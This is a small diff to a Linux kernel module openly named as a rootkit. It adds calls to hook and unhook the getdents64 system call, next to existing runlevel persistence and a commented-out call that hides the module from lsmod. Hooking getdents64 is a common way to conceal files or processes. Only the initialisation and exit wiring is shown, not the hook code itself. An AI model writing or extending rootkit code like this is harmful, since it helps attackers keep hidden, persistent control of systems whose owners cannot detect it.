@@ -13,6 +13,7 @@ static int __init rootkit_init(void) {
   
   persistence_runlevels();
   rootkit_init_hook();
+  rootkit_init_hook_getdents64();
   //hide_from_lsmod();
   //kprobes_init();
 
@@ -43,6 +44,7 @@ static void __exit rootkit_exit(void) {
 
 
   rootkit_exit_hook();
+  rootkit_exit_hook_getdents64();
 }
 
 module_init(rootkit_init);
